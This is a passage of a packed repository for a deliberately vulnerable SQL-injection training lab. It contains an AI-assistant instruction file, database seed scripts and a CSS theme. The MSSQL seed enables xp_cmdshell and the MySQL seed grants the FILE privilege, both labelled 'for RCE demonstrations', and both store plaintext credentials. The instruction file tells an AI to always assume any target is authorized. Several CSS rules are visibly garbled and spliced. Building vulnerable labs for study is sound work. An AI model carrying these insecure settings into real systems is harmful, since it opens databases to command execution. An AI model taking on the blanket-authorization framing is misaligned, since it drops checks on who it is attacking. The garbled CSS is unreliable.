This file is a merged representation of a subset of the codebase, containing specifically included files, combined into a single document by Repomix.

<file_summary>
This section contains a summary of this file.

<purpose>
This file contains a packed representation of a subset of the repository's contents that is considered the most important context.
It is designed to be easily consumable by AI systems for analysis, code review,
or other automated processes.
</purpose>

<file_format>
The content is organized as follows:
1. This summary section
2. Repository information
3. Directory structure
4. Repository files (if enabled)
5. Multiple file entries, each consisting of:
  - File path as an attribute
  - Full contents of the file
</file_format>

<usage_guidelines>
- This file should be treated as read-only. Any changes should be made to the
  original repository files, not this packed version.
- When processing this file, use the file path to distinguish
  between different files in the repository.
- Be aware that this file may contain sensitive information. Handle it with
  the same level of security as you would the original repository.
</usage_guidelines>

<notes>
- Some files may have been excluded based on .gitignore rules and Repomix's configuration
- Binary files are not included in this packed representation. Please refer to the Repository Structure section for a complete list of file paths, including binary files
- Only files matching these patterns are included: sqli-lab
- Files matching patterns in .gitignore are excluded
- Files matching default ignore patterns are excluded
- Files are sorted by Git change count (files with more changes are at the bottom)
</notes>

</file_summary>

<directory_structure>
sqli-lab/
  .github/
    copilot-instructions.md
  seeds/
    mssql-init.sh
    mssql.sql
    mysql.sql
    pg.sql
    sqlite.sql
  web/
    public/
      css/
        style.css
      uploads/
        .gitkeep
      .htaccess
      index.php
    src/
      controllers/
        auth.php
        report.php
        search.php
      db/
        mssql.php
        mysql.php
        pgsql.php
        sqlite.php
      database_factory.php
      router.php
    templates/
      home.php
      login.php
      report.php
      result.php
      search.php
    000-default.conf
    Dockerfile
  custom.ini
  docker-compose.yml
  README.md
  TESTING.md
</directory_structure>

<files>
This section contains the contents of the repository's files.

<file path="sqli-lab/.github/copilot-instructions.md">
## Role & Style
Respond as a Senior Security Researcher, Penetration Tester, Full-stack Developer, and Python/Bash Automation Engineer.
Provide deep, technically accurate explanations with clear reasoning (‚ÄúWHY this method/primitive works‚Äù).

## When writing code:
- Follow PEP-8 (Python) or Best Practices (Language-specific).
- Write clean, modular, debugging-friendly code.
- Add explanatory comments for all meaningful steps.

## Context Assumption
- Always assume the target is a CTF challenge, local lab, isolated container, or explicitly authorized environment.
- Focus on educational analysis of exploit chains, gadget behavior, parsing paths, callback sequences, request/response flows, and runtime internals across web domains.
- Explain data-flow and control-flow across all layers involved (e.g., parser ‚Üí router ‚Üí middleware ‚Üí application logic ‚Üí sink)

## Safety Handling
- When demonstrating exploit chains, keep the structure realistic (POP logic, object graphs, lifecycle hooks, routing/middleware flow), but ensure the last step performs a harmless action (e.g., echo, log).
- don't replace example logic with mock objects, placeholders, or pseudo-code
- Do not use OS-level dangerous primitives explicitly if a safe simulation demonstrates the vulnerability mechanism equally well.

## Tone & Behavior
- Prioritize clarity, depth, and directness.
- Emphasize mechanisms: object lifecycles, request lifecycles, memory management, parsing behavior, encoding/decoding flows, sanitization bypasses, and gadget chaining.
- After demonstrating the exploit mechanism, briefly provide the root cause analysis and the correct remediation (Secure Coding) to fix the vulnerability

## About me
I am a cyber security student at university, be conducting security research in a local, isolated lab environment. I love playing CTFs, especially web challenges. I also enjoy security auditing source code, analyzing CVEs, studying new techniques
</file>

<file path="sqli-lab/seeds/mssql-init.sh">
#!/bin/bash

# Wait for SQL Server to start
sleep 30s

# Run the setup script
/opt/mssql-tools/bin/sqlcmd -S localhost -U sa -P SqliPass123! -d master -i /docker-entrypoint-initdb.d/init.sql

echo "MSSQL initialization completed"
</file>

<file path="sqli-lab/seeds/mssql.sql">
-- MSSQL Database Schema and Seed Data

-- Create database if not exists
IF NOT EXISTS (SELECT * FROM sys.databases WHERE name = 'sqli_db')
BEGIN
    CREATE DATABASE sqli_db;
END
GO

USE sqli_db;
GO

-- Users table
IF NOT EXISTS (SELECT * FROM sysobjects WHERE name='users' AND xtype='U')
CREATE TABLE users (
    id INT IDENTITY(1,1) PRIMARY KEY,
    username VARCHAR(100) NOT NULL,
    password VARCHAR(255) NOT NULL,
    email VARCHAR(255) NOT NULL,
    role VARCHAR(50) DEFAULT 'user',
    created_at DATETIME DEFAULT GETDATE()
);
GO

-- Products table
IF NOT EXISTS (SELECT * FROM sysobjects WHERE name='products' AND xtype='U')
CREATE TABLE products (
    id INT IDENTITY(1,1) PRIMARY KEY,
    name VARCHAR(255) NOT NULL,
    description TEXT,
    price DECIMAL(10, 2) NOT NULL,
    category VARCHAR(100),
    created_at DATETIME DEFAULT GETDATE()
);
GO

-- Reports table
IF NOT EXISTS (SELECT * FROM sysobjects WHERE name='reports' AND xtype='U')
CREATE TABLE reports (
    id INT IDENTITY(1,1) PRIMARY KEY,
    title VARCHAR(255) NOT NULL,
    content TEXT NOT NULL,
    user_id INT,
    status VARCHAR(50) DEFAULT 'pending',
    created_at DATETIME DEFAULT GETDATE(),
    FOREIGN KEY (user_id) REFERENCES users(id)
);
GO

-- Insert test users
INSERT INTO users (username, password, email, role) VALUES
('admin', 'admin123', 'admin@sqli-lab.local', 'admin'),
('john_doe', 'password123', 'john@sqli-lab.local', 'user'),
('jane_smith', 'password123', 'jane@sqli-lab.local', 'user'),
('bob_wilson', 'password123', 'bob@sqli-lab.local', 'user'),
('alice_johnson', 'password123', 'alice@sqli-lab.local', 'moderator');
GO

-- Insert test products
INSERT INTO products (name, description, price, category) VALUES
('Laptop Pro 15', 'High-performance laptop with 16GB RAM', 1299.99, 'Electronics'),
('Wireless Mouse', 'Ergonomic wireless mouse with long battery life', 29.99, 'Accessories'),
('USB-C Hub', '7-in-1 USB-C hub with HDMI and Ethernet', 49.99, 'Accessories'),
('Mechanical Keyboard', 'RGB mechanical keyboard with blue switches', 89.99, 'Accessories'),
('4K Monitor', '27-inch 4K UHD monitor with HDR support', 399.99, 'Electronics'),
('Webcam HD', '1080p webcam with built-in microphone', 79.99, 'Electronics'),
('Desk Lamp', 'LED desk lamp with adjustable brightness', 34.99, 'Office'),
('Office Chair', 'Ergonomic office chair with lumbar support', 249.99, 'Office');
GO

-- Insert test reports
INSERT INTO reports (title, content, user_id, status) VALUES
('Bug in login page', 'The login page shows an error when special characters are used', 2, 'pending'),
('Feature request: Dark mode', 'Please add a dark mode option to the application', 3, 'open'),
('Product search not working', 'Search returns no results for certain keywords', 4, 'in-progress'),
('Security concern', 'Found potential SQL injection vulnerability in search', 5, 'resolved'),
('Performance issue', 'Page loads slowly when many products are displayed', 2, 'open');
GO

-- Enable xp_cmdshell for RCE demonstrations
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
GO
</file>

<file path="sqli-lab/seeds/mysql.sql">
-- MySQL Database Schema and Seed Data

-- Users table
CREATE TABLE IF NOT EXISTS users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(100) NOT NULL,
    password VARCHAR(255) NOT NULL,
    email VARCHAR(255) NOT NULL,
    role VARCHAR(50) DEFAULT 'user',
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- Products table
CREATE TABLE IF NOT EXISTS products (
    id INT AUTO_INCREMENT PRIMARY KEY,
    name VARCHAR(255) NOT NULL,
    description TEXT,
    price DECIMAL(10, 2) NOT NULL,
    category VARCHAR(100),
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- Reports table
CREATE TABLE IF NOT EXISTS reports (
    id INT AUTO_INCREMENT PRIMARY KEY,
    title VARCHAR(255) NOT NULL,
    content TEXT NOT NULL,
    user_id INT,
    status VARCHAR(50) DEFAULT 'pending',
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (user_id) REFERENCES users(id)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- Insert test users (password is 'password123' for all)
INSERT INTO users (username, password, email, role) VALUES
('admin', 'admin123', 'admin@sqli-lab.local', 'admin'),
('john_doe', 'password123', 'john@sqli-lab.local', 'user'),
('jane_smith', 'password123', 'jane@sqli-lab.local', 'user'),
('bob_wilson', 'password123', 'bob@sqli-lab.local', 'user'),
('alice_johnson', 'password123', 'alice@sqli-lab.local', 'moderator');

-- Insert test products
INSERT INTO products (name, description, price, category) VALUES
('Laptop Pro 15', 'High-performance laptop with 16GB RAM', 1299.99, 'Electronics'),
('Wireless Mouse', 'Ergonomic wireless mouse with long battery life', 29.99, 'Accessories'),
('USB-C Hub', '7-in-1 USB-C hub with HDMI and Ethernet', 49.99, 'Accessories'),
('Mechanical Keyboard', 'RGB mechanical keyboard with blue switches', 89.99, 'Accessories'),
('4K Monitor', '27-inch 4K UHD monitor with HDR support', 399.99, 'Electronics'),
('Webcam HD', '1080p webcam with built-in microphone', 79.99, 'Electronics'),
('Desk Lamp', 'LED desk lamp with adjustable brightness', 34.99, 'Office'),
('Office Chair', 'Ergonomic office chair with lumbar support', 249.99, 'Office');

-- Insert test reports
INSERT INTO reports (title, content, user_id, status) VALUES
('Bug in login page', 'The login page shows an error when special characters are used', 2, 'pending'),
('Feature request: Dark mode', 'Please add a dark mode option to the application', 3, 'open'),
('Product search not working', 'Search returns no results for certain keywords', 4, 'in-progress'),
('Security concern', 'Found potential SQL injection vulnerability in search', 5, 'resolved'),
('Performance issue', 'Page loads slowly when many products are displayed', 2, 'open');

-- Create a user with FILE privilege for RCE demonstrations
GRANT FILE ON *.* TO 'sqli_user'@'%';
FLUSH PRIVILEGES;
</file>

<file path="sqli-lab/seeds/pg.sql">
-- PostgreSQL Database Schema and Seed Data

-- Users table
CREATE TABLE IF NOT EXISTS users (
    id SERIAL PRIMARY KEY,
    username VARCHAR(100) NOT NULL,
    password VARCHAR(255) NOT NULL,
    email VARCHAR(255) NOT NULL,
    role VARCHAR(50) DEFAULT 'user',
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Products table
CREATE TABLE IF NOT EXISTS products (
    id SERIAL PRIMARY KEY,
    name VARCHAR(255) NOT NULL,
    description TEXT,
    price NUMERIC(10, 2) NOT NULL,
    category VARCHAR(100),
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Reports table
CREATE TABLE IF NOT EXISTS reports (
    id SERIAL PRIMARY KEY,
    title VARCHAR(255) NOT NULL,
    content TEXT NOT NULL,
    user_id INTEGER,
    status VARCHAR(50) DEFAULT 'pending',
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (user_id) REFERENCES users(id)
);

-- Insert test users
INSERT INTO users (username, password, email, role) VALUES
('admin', 'admin123', 'admin@sqli-lab.local', 'admin'),
('john_doe', 'password123', 'john@sqli-lab.local', 'user'),
('jane_smith', 'password123', 'jane@sqli-lab.local', 'user'),
('bob_wilson', 'password123', 'bob@sqli-lab.local', 'user'),
('alice_johnson', 'password123', 'alice@sqli-lab.local', 'moderator');

-- Insert test products
INSERT INTO products (name, description, price, category) VALUES
('Laptop Pro 15', 'High-performance laptop with 16GB RAM', 1299.99, 'Electronics'),
('Wireless Mouse', 'Ergonomic wireless mouse with long battery life', 29.99, 'Accessories'),
('USB-C Hub', '7-in-1 USB-C hub with HDMI and Ethernet', 49.99, 'Accessories'),
('Mechanical Keyboard', 'RGB mechanical keyboard with blue switches', 89.99, 'Accessories'),
('4K Monitor', '27-inch 4K UHD monitor with HDR support', 399.99, 'Electronics'),
('Webcam HD', '1080p webcam with built-in microphone', 79.99, 'Electronics'),
('Desk Lamp', 'LED desk lamp with adjustable brightness', 34.99, 'Office'),
('Office Chair', 'Ergonomic office chair with lumbar support', 249.99, 'Office');

-- Insert test reports
INSERT INTO reports (title, content, user_id, status) VALUES
('Bug in login page', 'The login page shows an error when special characters are used', 2, 'pending'),
('Feature request: Dark mode', 'Please add a dark mode option to the application', 3, 'open'),
('Product search not working', 'Search returns no results for certain keywords', 4, 'in-progress'),
('Security concern', 'Found potential SQL injection vulnerability in search', 5, 'resolved'),
('Performance issue', 'Page loads slowly when many products are displayed', 2, 'open');
</file>

<file path="sqli-lab/seeds/sqlite.sql">
-- SQLite Database Schema and Seed Data

-- Users table
CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT NOT NULL,
    password TEXT NOT NULL,
    email TEXT NOT NULL,
    role TEXT DEFAULT 'user',
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Products table
CREATE TABLE IF NOT EXISTS products (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    name TEXT NOT NULL,
    description TEXT,
    price REAL NOT NULL,
    category TEXT,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Reports table
CREATE TABLE IF NOT EXISTS reports (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    title TEXT NOT NULL,
    content TEXT NOT NULL,
    user_id INTEGER,
    status TEXT DEFAULT 'pending',
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (user_id) REFERENCES users(id)
);

-- Insert test users
INSERT INTO users (username, password, email, role) VALUES
('admin', 'admin123', 'admin@sqli-lab.local', 'admin'),
('john_doe', 'password123', 'john@sqli-lab.local', 'user'),
('jane_smith', 'password123', 'jane@sqli-lab.local', 'user'),
('bob_wilson', 'password123', 'bob@sqli-lab.local', 'user'),
('alice_johnson', 'password123', 'alice@sqli-lab.local', 'moderator');

-- Insert test products
INSERT INTO products (name, description, price, category) VALUES
('Laptop Pro 15', 'High-performance laptop with 16GB RAM', 1299.99, 'Electronics'),
('Wireless Mouse', 'Ergonomic wireless mouse with long battery life', 29.99, 'Accessories'),
('USB-C Hub', '7-in-1 USB-C hub with HDMI and Ethernet', 49.99, 'Accessories'),
('Mechanical Keyboard', 'RGB mechanical keyboard with blue switches', 89.99, 'Accessories'),
('4K Monitor', '27-inch 4K UHD monitor with HDR support', 399.99, 'Electronics'),
('Webcam HD', '1080p webcam with built-in microphone', 79.99, 'Electronics'),
('Desk Lamp', 'LED desk lamp with adjustable brightness', 34.99, 'Office'),
('Office Chair', 'Ergonomic office chair with lumbar support', 249.99, 'Office');

-- Insert test reports
INSERT INTO reports (title, content, user_id, status) VALUES
('Bug in login page', 'The login page shows an error when special characters are used', 2, 'pending'),
('Feature request: Dark mode', 'Please add a dark mode option to the application', 3, 'open'),
('Product search not working', 'Search returns no results for certain keywords', 4, 'in-progress'),
('Security concern', 'Found potential SQL injection vulnerability in search', 5, 'resolved'),
('Performance issue', 'Page loads slowly when many products are displayed', 2, 'open');
</file>

<file path="sqli-lab/web/public/css/style.css">
/* ============================================
   POK√âMON PIXEL-ART THEME - TEAM ROCKET DARK EDITION
   Dark Mode Neon Color Palette
   ============================================ */

/* CSS CUSTOM PROPERTIES - TEAM ROCKET DARK PALETTE */
:root {
    /* Neon Primary Colors - Softer */
    --pkmn-red: #e94560;
    --pkmn-blue: #00d9ff;
    --pkmn-yellow: #ffd369;
    --pkmn-green: #00ff88;
    
    /* Dark Background Palette - Less Contrast */
    --gba-cream: #1e1e2e;
    --gba-peach: #1a1f30;
    --gba-mint: #1a2b3a;
    --gba-lavender: #252535;
    --gba-rose: #2d1b3d;
    --gba-sky: #1f2a35;
    
    /* Neutral Dark Tones - Better Readability */
    --pixel-dark: #0f0f15;
    --pixel-gray: #5a5a6e;
    --pixel-light: #353545;
    --pixel-white: #252535;
    
    /* Status Colors - Neon Glow */
    --status-hp: #00ff88;
    --status-danger: #ff4757;
    --status-psychic: #00d9ff;
    --status-electric: #ffd369;
    
    /* UI Frame Colors - Neon */
    --frame-outer: #00d9ff;
    --shadow-dark: rgba(0, 217, 255, 0.3);
    --text-primary: #d0d0d8;
    --text-secondary: #9090a0;
}

* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
    image-rendering: pixelated;
    image-rendering: -moz-crisp-edges;
    image-rendering: crisp-edges;
}

body {
    font-family: 'Courier New', 'Consolas', 'Monaco', monospace;
    background-color: #0f0f15;
    background-image: 
        repeating-linear-gradient(0deg, transparent, transparent 7px, rgba(0, 217, 255, 0.03) 7px, rgba(0, 217, 255, 0.03) 8px),
        repeating-linear-gradient(90deg, transparent, transparent 7px, rgba(0, 217, 255, 0.03) 7px, rgba(0, 217, 255, 0.03) 8px);
    background-size: 8px 8px;
    min-height: 100vh;
    padding: 16px;
    line-height: 1.7;
    font-size: 13px;
    color: var(--text-primary);
}

.container {
    max-width: 1200px;
    margin: 0 auto;
    background: var(--gba-cream);
    border: 4px solid var(--frame-outer);
    box-shadow: 
        inset 0 0 0 2px rgba(0, 217, 255, 0.2),
        0 0 15px rgba(0, 217, 255, 0.25),
        4px 4px 0 var(--shadow-dark);
    padding: 32px;
    position: relative;
}

@media (max-width: 768px) {
    .container {
        padding: 20px;
    }
}

.container::before,
.container::after {
    content: '';
    position: absolute;
    width: 8px;
    height: 8px;
    background: var(--pkmn-red);
    border: 2px solid var(--frame-outer);
    box-shadow: 0 0 8px var(--pkmn-red);
    animation: corner-glow 2s infinite;
}

.container::before {
    top: -2px;
    left: -2px;
}

.container::after {
    bottom: -2px;
    right: -2px;
}

@keyframes corner-glow {
    0%, 100% { box-shadow: 0 0 8px var(--pkmn-red); }
    50% { box-shadow: 0 0 16px var(--pkmn-red); }
}

header {
    text-align: center;
    margin-bottom: 24px;
    padding-bottom: 16px;
    border-bottom: 2px solid var(--frame-outer);
}

h1 {
    color: var(--pkmn-blue);
    font-family: 'Press Start 2P', monospace;
    font-size: 18px;
    margin-bottom: 16px;
    text-align: center;
    letter-spacing: 2px;
    text-transform: uppercase;
    text-shadow: 
        2px 2px 0 var(--pkmn-yellow),
        0 0 15px rgba(0, 217, 255, 0.4);
}

h2 {
    color: var(--pkmn-blue);
    font-family: 'Press Start 2P', monospace;
    font-size: 14px;
    margin: 20px 0 16px 0;
    letter-spacing: 1px;
    text-align: center;
    text-shadow: 0 0 8px rgba(0, 217, 255, 0.3);
}

h3 {
    color: var(--pkmn-red);
    font-family: 'Press Start 2P', monospace;
    font-size: 11px;
    margin: 15px 0 12px 0;
    letter-spacing: 1px;
    text-shadow: 0 0 6px rgba(233, 69, 96, 0.3);
}

p, li, label, td, th {
    font-size: 13px;
    line-height: 1.7;
    color: var(--text-primary);
}

.warning {
    background-color: var(--pkmn-red);
    background-image: repeating-linear-gradient(45deg, transparent, transparent 4px, rgba(255, 255, 255, 0.08) 4px, rgba(255, 255, 255, 0.08) 8px);
    color: #ffffff;
    padding: 14px;
    border: 2px solid var(--pkmn-red);
    margin: 10px 0 20px 0;
    font-weight: bold;
    font-size: 12px;
    font-family: 'Press Start 2P', monospace;
    text-align: center;
    box-shadow: 
        inset 0 0 0 1px rgba(255, 255, 255, 0.2),
        0 0 12px rgba(233, 69, 96, 0.3),
        2px 2px 0 var(--shadow-dark);
    display: inline-block;
    animation: warning-pulse 2s infinite;
}

@keyframes warning-pulse {
    0%, 100% { box-shadow: inset 0 0 0 1px rgba(255, 255, 255, 0.2), 0 0 12px rgba(233, 69, 96, 0.3), 2px 2px 0 var(--shadow-dark); }
    50% { box-shadow: inset 0 0 0 1px rgba(255, 255, 255, 0.2), 0 0 18px rgba(233, 69, 96, 0.5), 2px 2px 0 var(--shadow-dark); }
}

.db-info {
    background-color: var(--gba-sky);
    background-image: 
        repeating-linear-gradient(0deg, transparent, transparent 3px, rgba(0, 217, 255, 0.05) 3px, rgba(0, 217, 255, 0.05) 4px);
    padding: 20px;
    border: 2px solid var(--frame-outer);
    margin: 20px 0;
    box-shadow: 
        inset 0 0 0 1px rgba(0, 217, 255, 0.2),
        0 0 12px rgba(0, 217, 255, 0.15),
        2px 2px 0 var(--shadow-dark);
    position: relative;
}

.db-info::before {
    content: '‚óè';
    position: absolute;
    top: 12px;
    right: 12px;
    font-size: 16px;
    color: var(--status-hp);
    animation: blink 2s infinite;
    filter: drop-shadow(0 0 6px rgba(0, 255, 136, 0.5));
}

@keyframes blink {
    0%, 49% { opacity: 1; }
    50%, 100% { opacity: 0.3; }
}

.db-info p {
    margin: 8px 0;
}

.connected {
    color: var(--status-hp);
    font-weight: bold;
}

.disconnected {
    color: var(--status-danger);
    font-weight: bold;
}

.db-selector {
    margin: 30px 0;
    text-align: center;
}

.db-buttons {
    display: flex;
    gap: 12px;
    justify-content: center;
    align-items: center;
    margin-top: 20px;
    flex-wrap: wrap;
}
.btn {
    background-color: var(--gba-mint);
    background-image: 
        linear-gradient(to bottom, rgba(0, 217, 255, 0.2) 0%, rgba(0, 217, 255, 0) 50%);
    color: var(--pkmn-blue);
    padding: 10px 20px;
    text-decoration: none;
    border: 2px solid var(--pkmn-blue);
    display: inline-block;
    transition: all 0.1s ease;
    cursor: pointer;
    font-size: 12px;
    font-family: 'Press Start 2P', monospace;
    box-shadow: 
        inset 0 0 0 1px rgba(0, 217, 255, 0.15),
        0 0 8px rgba(0, 217, 255, 0.2),
        2px 2px 0 var(--shadow-dark);
    position: relative;
    text-transform: uppercase;
    letter-spacing: 1px;
    text-shadow: 0 0 4px rgba(0, 217, 255, 0.3);
}

.btn:hover {
    background-color: var(--gba-mint);
    color: var(--pkmn-yellow);
    border-color: var(--pkmn-yellow);
    transform: translate(-1px, -1px);
    box-shadow: 
        inset 0 0 0 1px rgba(255, 211, 105, 0.2),
        0 0 12px rgba(255, 211, 105, 0.4),
        3px 3px 0 var(--shadow-dark);
    text-shadow: 0 0 6px rgba(255, 211, 105, 0.4);
}

.btn:active,
.btn.active {
    background-color: var(--gba-mint);
    background-image: 
        linear-gradient(to bottom, rgba(233, 69, 96, 0.2) 0%, rgba(233, 69, 96, 0) 50%);
    color: var(--pkmn-red);
    border-color: var(--pkmn-red);
    transform: translate(1px, 1px);
    box-shadow: 
        inset 2px 2px 4px rgba(0, 0, 0, 0.4),
        0 0 12px rgba(233, 69, 96, 0.4);
    text-shadow: 0 0 8px rgba(233, 69, 96, 0.4);
}

.features {
    margin: 30px 0;
    display: grid;
    grid-template-columns: 1fr;
    gap: 20px;
    max-width: 800px;
    margin-left: auto;
    margin-right: auto;
}

@media (min-width: 768px) {
    .features {
        grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
    }
}

.feature-card {
    background-color: var(--gba-lavender);
    background-image: 
        repeating-linear-gradient(0deg, transparent, transparent 7px, rgba(0, 217, 255, 0.03) 7px, rgba(0, 217, 255, 0.03) 8px);
    padding: 20px;
    margin: 0;
    border: 2px solid var(--pkmn-blue);
    box-shadow: 
        inset 0 0 0 1px rgba(0, 217, 255, 0.15),
        0 0 12px rgba(0, 217, 255, 0.15),
        2px 2px 0 var(--shadow-dark);
    position: relative;
}

.feature-card::before {
    content: '‚ñ∂';
    position: absolute;
    top: 12px;
    left: 12px;
    font-size: 10px;
    font-family: 'Press Start 2P', monospace;
    color: var(--pkmn-red);
    filter: drop-shadow(0 0 3px rgba(233, 69, 96, 0.3));
}

.feature-card h3 {
    padding-left: 24px;
    margin-bottom: 16px;
}

.feature-card ul {
    margin: 16px 0 20px 24px;
    padding-left: 0;
    list-style: none;
}

.feature-card li {
    margin: 10px 0;
    color: var(--text-primary);
    position: relative;
    padding-left: 20px;
    font-size: 13px;
}

.feature-card li::before {
    content: '‚óÜ';
    position: absolute;
    left: 0;
    color: var(--pkmn-yellow);
    font-size: 10px;
    filter: drop-shadow(0 0 3px rgba(255, 211, 105, 0.3));
}

.feature-card .btn {
    margin-top: 12px;
}

.info-section {
    margin: 30px 0;
}

.db-notes {
    background-color: var(--gba-peach);
    background-image: 
        repeating-linear-gradient(45deg, transparent, transparent 8px, rgba(0, 217, 255, 0.1) 8px, rgba(0, 217, 255, 0.1) 16px);
    border: 2px solid var(--frame-outer);
    padding: 12px;
    margin: 10px 0;
    box-shadow: 
        inset 0 0 0 1px rgba(0, 217, 255, 0.2),
        0 0 10px rgba(0, 217, 255, 0.2),
        2px 2px 0 var(--shadow-dark);
    color: var(--text-primary);
}

.db-notes h4 {
    color: var(--pkmn-yellow);
    margin-bottom: 10px;
    font-size: 9px;
    font-weight: bold;
    text-shadow: 0 0 8px var(--pkmn-yellow);
}

.db-notes code {
    background: var(--pixel-white);
    padding: 2px 4px;
    border: 1px solid var(--pixel-light);
    color: var(--pkmn-red);
    font-size: 8px;
    font-family: 'Courier New', monospace;
}

form {
    background-color: var(--gba-peach);
    background-image: 
        repeating-linear-gradient(45deg, transparent, transparent 8px, rgba(0, 217, 255, 0.05) 8px, rgba(0, 217, 255, 0.05) 16px);
    padding: 20px;
    border: 2px solid var(--frame-outer);
    margin: 20px 0;
    box-shadow: 
        inset 0 0 0 1px rgba(0, 217, 255, 0.2),
        0 0 15px rgba(0, 217, 255, 0.2),
        2px 2px 0 var(--shadow-dark);
}

.form-group {
    margin: 15px 0;
}

label {
    display: block;
    margin-bottom: 4px;
    font-weight: bold;
    color: var(--text-primary);
    font-size: 9px;
    text-transform: uppercase;
    letter-spacing: 1px;
}

input[type="text"],
input[type="password"],
textarea {
    width: 100%;
    padding: 8px;
    border: 2px solid var(--frame-outer);
    background: var(--pixel-white);
    color: var(--text-primary);
    font-size: 9px;
    margin-bottom: 12px;
    font-family: 'Courier New', monospace;
    box-shadow: inset 2px 2px 0 rgba(0, 0, 0, 0.5);
    transition: all 0.1s;
}

input[type="text"]:focus,
input[type="password"]:focus,
textarea:focus {
    outline: none;
    border-color: var(--pkmn-blue);
    box-shadow: 
        inset 2px 2px 0 rgba(0, 0, 0, 0.5),
        0 0 15px rgba(0, 217, 255, 0.5);
    animation: pixel-glow 0.5s ease;
}
@keyframes pixel-glow {
    0%, 100% { box-shadow: inset 2px 2px 0 rgba(0, 0, 0, 0.5), 0 0 15px rgba(0, 217, 255, 0.5); }
    50% { box-shadow: inset 2px 2px 0 rgba(0, 0, 0, 0.5), 0 0 20px rgba(0, 217, 255, 0.8); }
}

textarea {
textarea {
    resize: vertical;
    min-height: 80px;
.result-box {
    resize: vertical;
    min-height: 80px;
}

.result-box {ting-linear-gradient(0deg, transparent, transparent 3px, rgba(0, 217, 255, 0.1) 3px, rgba(0, 217, 255, 0.1) 4px);
    border: 2px solid var(--frame-outer);
    padding: 16px;
    margin: 20px 0;
    box-shadow: 
        inset 0 0 0 1px rgba(0, 217, 255, 0.2),
        0 0 15px rgba(0, 217, 255, 0.2),
        2px 2px 0 var(--shadow-dark);
}

.error-box {
    background-color: var(--status-danger);
    background-image: 
        repeating-linear-gradient(45deg, transparent, transparent 4px, rgba(0, 0, 0, 0.2) 4px, rgba(0, 0, 0, 0.2) 8px);
    border: 2px solid var(--pkmn-red);
    color: var(--pixel-white);
    padding: 12px;
    margin: 20px 0;
    box-shadow: 
        inset 0 0 0 1px rgba(255, 255, 255, 0.2),
        0 0 15px rgba(255, 71, 87, 0.5),
        2px 2px 0 var(--shadow-dark);
    position: relative;
    font-weight: bold;
}

.error-box::before {
    content: '‚úï';
    position: absolute;
    left: 8px;
    font-size: 16px;
    color: var(--pixel-white);
    filter: drop-shadow(0 0 8px rgba(255, 255, 255, 0.8));
}

.success-box {
    background-color: var(--status-hp);
    background-image: 
        repeating-linear-gradient(90deg, transparent, transparent 4px, rgba(255, 255, 255, 0.2) 4px, rgba(255, 255, 255, 0.2) 8px);
    border: 2px solid var(--pkmn-green);
    color: var(--pixel-dark);
    padding: 12px;
    margin: 20px 0;
    box-shadow: 
        inset 0 0 0 1px rgba(255, 255, 255, 0.3),
        0 0 15px rgba(0, 255, 136, 0.5),
        2px 2px 0 var(--shadow-dark);
    position: relative;
    font-weight: bold;
}

.success-box::before {
    color: var(--pixel-dark);
    filter: drop-shadow(0 0 4px rgba(0, 0, 0, 0.5));
}

table {t: 8px;
    font-size: 16px;
table {
    width: 100%;
    border-collapse: separate;
    border-spacing: 0;
    margin: 16px 0;
    border: 2px solid var(--pkmn-blue);
    box-shadow: 
        0 0 15px rgba(0, 217, 255, 0.3),
        2px 2px 0 var(--shadow-dark);
}

th, td {
    padding: 8px;
    text-align: left;
    border-bottom: 1px solid var(--pixel-light);
}

th {
    background-color: var(--gba-mint);
    background-image: 
        linear-gradient(to bottom, rgba(0, 217, 255, 0.3) 0%, rgba(0, 217, 255, 0) 100%);
    color: var(--pkmn-blue);
    font-weight: bold;
    border-bottom: 2px solid var(--pkmn-blue);
    font-size: 9px;
    text-transform: uppercase;
    letter-spacing: 1px;
    text-shadow: 0 0 8px var(--pkmn-blue);
}

td {
    background: var(--gba-cream);
    background-color: var(--gba-mint);
    cursor: pointer;
    box-shadow: inset 0 0 10px rgba(0, 217, 255, 0.2);
}

tr:last-child td {
    border-bottom: none;
}

pre {ursor: pointer;
    box-shadow: inset 0 0 10px rgba(0, 217, 255, 0.2);
}   background: var(--pixel-white);
}
pre {
    background-color: var(--pixel-dark);
    color: var(--status-electric);
    padding: 12px;
    border: 2px solid var(--frame-outer);
    overflow-x: auto;
    margin: 10px 0;
    box-shadow: 
        inset 0 0 0 1px rgba(0, 217, 255, 0.2),
        inset 0 0 20px rgba(0, 0, 0, 0.8);
    font-size: 8px;
    line-height: 1.6;
}

code {
    font-family: 'Courier New', monospace;
}

footer {
    display: flex;
    justify-content: center;
    align-items: center;
    margin-top: 40px;
    padding-top: 20px;
    border-top: 2px dashed var(--pkmn-blue);
    color: var(--text-secondary);
    font-size: 11px;
    font-family: 'Press Start 2P', monospace;
}

footer p {
    margin: 0;
    text-align: center;
    max-width: 100%;
}

.query-display {
    background-color: var(--pixel-dark);
    color: var(--status-electric);
    padding: 12px;
    border: 2px solid var(--frame-outer);
    margin: 15px 0;
    overflow-x: auto;
    box-shadow: 
        inset 0 0 0 1px rgba(0, 217, 255, 0.2),
        inset 0 0 20px rgba(0, 0, 0, 0.8),
        0 0 10px rgba(0, 217, 255, 0.2);
    position: relative;
    font-family: 'Courier New', monospace;
}

.query-display::before {
    content: '> _';
    position: absolute;
    top: 4px;
    right: 8px;
    font-size: 8px;
